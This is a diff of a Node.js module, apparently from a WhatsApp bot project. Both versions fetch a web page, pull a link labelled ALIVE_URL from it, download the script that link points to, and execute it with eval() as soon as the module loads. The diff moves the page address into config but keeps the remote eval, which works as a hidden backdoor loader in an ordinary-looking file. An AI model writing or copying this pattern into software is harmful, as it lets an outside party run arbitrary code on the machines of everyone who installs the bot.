@@ -1,30 +1,29 @@
  // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​
 
-'use strict';
-
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchAliveUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const aliveUrl = $(`a:contains("ALIVE_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!aliveUrl) throw new Error('ALIVE_URL not found on the webpage.');
+    const aliveUrlElement = $('a:contains("ALIVE_URL")');
+    const aliveUrl = aliveUrlElement.attr('href');
 
-        console.log('ALIVE_URL fetched successfully:', aliveUrl);
-
-        const scriptResponse = await axios.get(aliveUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("ALIVE_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching ALIVE_URL:', error.message);
+    if (!aliveUrl) {
+      throw new Error('Alive URL link not found...');
     }
+
+    console.log('Alive URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(aliveUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchAliveUrl();
